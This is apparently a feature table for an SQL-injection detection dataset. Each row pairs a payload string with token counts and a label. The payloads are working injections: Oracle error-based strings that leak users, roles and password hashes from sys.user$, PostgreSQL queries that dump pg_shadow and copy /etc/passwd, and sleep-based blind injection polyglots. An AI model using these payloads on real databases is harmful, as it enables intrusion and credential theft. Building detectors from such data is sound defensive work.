attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	alw_true
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	8	8	0	9	9	8	17	195	False
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	7	8	0	9	9	7	15	158	False
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	8	8	0	9	9	7	15	154	False
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	7	8	0	9	9	7	15	163	False
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	7	8	0	8	8	7	15	166	False
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	8	8	0	9	9	8	17	195	False
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	7	8	0	9	9	7	15	158	False
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	8	8	0	9	9	7	15	154	False
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	7	8	0	9	9	7	15	163	False
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	7	8	0	8	8	7	15	166	False
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	8	8	0	9	9	8	17	195	False
select version();	0	1	0	1	2	1	1	18	False
select current_database();	0	1	0	1	2	0	1	26	False
select current_user;	0	2	0	0	1	0	1	20	False
select session_user;	0	2	0	0	1	0	1	20	False
select current_setting('log_connections');	2	2	0	1	3	0	1	42	False
select current_setting('log_statement');	2	2	0	1	3	0	1	40	False
select current_setting('port');	2	2	0	1	3	0	1	31	False
select current_setting('password_encryption');	2	2	0	1	3	0	1	46	False
select current_setting('krb_server_keyfile');	2	2	0	1	3	0	1	45	False
select current_setting('virtual_host');	2	2	0	1	3	0	1	39	False
select current_setting('port');	2	2	0	1	3	0	1	31	False
select current_setting('config_file');	2	2	0	1	3	0	1	38	False
select current_setting('hba_file');	2	2	0	1	3	0	1	35	False
select current_setting('data_directory');	2	2	0	1	3	0	1	41	False
select * from pg_shadow;	0	2	0	0	2	1	3	24	False
select * from pg_group;	0	2	0	0	2	1	3	23	False
create table myfile (input text);	0	1	2	1	2	0	4	33	False
copy myfile from '/etc/passwd'; 	2	0	0	0	4	2	4	32	False
select * from myfile;copy myfile to /tmp/test;	0	1	0	0	5	2	6	46	False
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	0	4	0	6	5	3	9	49	False
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	4	4	0	6	8	3	9	49	False
